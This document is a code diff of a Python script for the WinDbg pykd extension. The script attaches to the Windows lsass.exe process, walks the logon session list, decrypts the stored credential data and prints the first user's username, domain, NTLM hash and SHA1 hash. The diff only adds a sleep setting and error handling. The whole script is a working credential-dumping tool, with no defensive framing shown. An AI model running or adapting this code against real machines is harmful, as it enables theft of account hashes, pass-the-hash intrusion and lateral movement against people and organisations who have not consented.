@@ -1,25 +1,33 @@
 import pykd
+import sys
 import time
 from pyDes import *
 from binascii import unhexlify,hexlify
 
 #.load C:\Users\uf0\Desktop\pykd\pykd.dll
 # !py c:\users\uf0\desktop\lsass.py
+
+time_interval = 0.5
 blob = pykd.dbgCommand("!process 0 0 lsass.exe")
 eproc =  blob.split(' ')[1]
 cmd1 = ".process /i /p /r %s" % eproc
 print cmd1
 pykd.dbgCommand(cmd1)
-time.sleep(1)
+time.sleep(time_interval)
 pykd.go()
 # reload userland modules
 pykd.dbgCommand(".reload /user")
-time.sleep(1)
+time.sleep(time_interval)
 
 #retrieve usename and logondomain
 users_blob = pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")
 users_pretty = users_blob.split('\n\n')
-first_user_data  = users_pretty[0] # weak this index to access multiple users	
+try:
+	first_user_data  = users_pretty[0] # weak this index to access multiple users	
+except IndexError:
+    print '\n(!) User Data structure ERROR - try reloading the target debugee OS'
+    sys.exit()
+
 first_user_data_neato = first_user_data.split('\n')
 first_username    = first_user_data_neato[0].split('  ')[1]
 first_logondomain = first_user_data_neato[1].split('  ')[1]
@@ -59,3 +67,4 @@ print "\n(*)USERNAME :" + first_username
 print "(*)LOGONDOMAIN :" + first_logondomain
 print "(*)NTLM :" + "".join(decrypted_dump_list[74:90])
 print "(*)SHA1 :" + "".join(decrypted_dump_list[106:126])
+
